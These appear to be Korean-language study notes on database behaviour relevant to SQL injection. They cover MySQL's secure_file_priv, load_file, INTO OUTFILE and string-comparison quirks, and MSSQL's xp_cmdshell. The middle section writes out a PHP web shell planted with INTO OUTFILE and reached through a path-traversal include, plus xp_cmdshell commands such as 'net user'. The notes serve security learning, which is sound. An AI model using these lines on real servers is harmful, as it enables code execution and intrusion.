MySQL
-- secure_file_priv -> 파일 접근 권한
-- MySQL애서 파일 관련된 작업을 할 때에는 MYSQL 권한으로 수행되며 "my.cnf" 설정 파일의
-- secure_file_priv 값에 영향을 받는다
-- secure_file_priv는 mysql 쿼리 내에서 load_file 혹은 outfile 을 이용해 파일에 접근할 때 접근할 수 있는 파일 경로에 대한 정보를 갖고 있다.
# my.cnf
# secure_file_priv = "" # 미설정. 기본 설정 값으로 설정
secure_file_priv = "/tmp" # 해당 디렉터리 하위 경로에만 접근 가능
secure_file_priv = "" # mysql의 권한이 가능한 모든 경로에 접근이 가능
secure_file_priv = NULL # 기능이 비활성화 됩니다.


-- load_file 함수는 인자로 전달된 파일을 읽고, 출력
-- 전달되는 파일은 전체 경로를 입력해야 하며 해당 파일에 접근 권한이 있어야 함
# echo test1234 > /var/lib/mysql-files/test
mysql> select load_file('/var/lib/mysql-files/test');
+----------------------------------------+
| load_file('/var/lib/mysql-files/test') |
+----------------------------------------+
| test1234                               |
+----------------------------------------+

저 경로에 있는 파일의 내용 test1234 출력


-- into outfile
-- select ... into 형식의 쿼리는 쿼리 결과를 변수나 파일에 쓸 수 있다. 만약 secure_file_priv의 값이 올바르지 않아 임의 경로에서
-- 파일작업을 수행할 수 있다면 이를 통해 웹셸을 업로드하는 등의 공격이 가능
select ... into var_list    # column 값을 변수에 저장
select ... into OUTFILE 'filename'  # 쿼리 결과의 rows 값을 파일에 저장
select ... into DUMPFILE 'filename' # 쿼리 결과(single row)를 파일에 저장

-- select ... into를 이용한 웹셸 작성
select '<?=`ls`?>' into outfile '/tmp/a.php';
/* <?php include $_GET['page'].'.php'; // "?page=../../../tmp/a" */


Out of DBMS: MSSQL
MSSQL에서는 xp_cmdshell기능을 이용해 os 명령어를 실행할 수 있다면
SQL SEREVER 2005 버전이후는 비활성화되어 있어 임의로 활성화하지 않는 이상 불가능하다
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell' 
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';


MySQL의 대소문자 구분
SELECT 'a'='A';
1

MSSQL
SELECT 1 FROM test WHERE 'a'='A';


MySQL 공백 문자로 끝나는 문자열 비교
select 'a'='a ';
1


MySQL의 공백 문자로 끝나는 문자열 비교
select 1 from test where 'a'='a ';


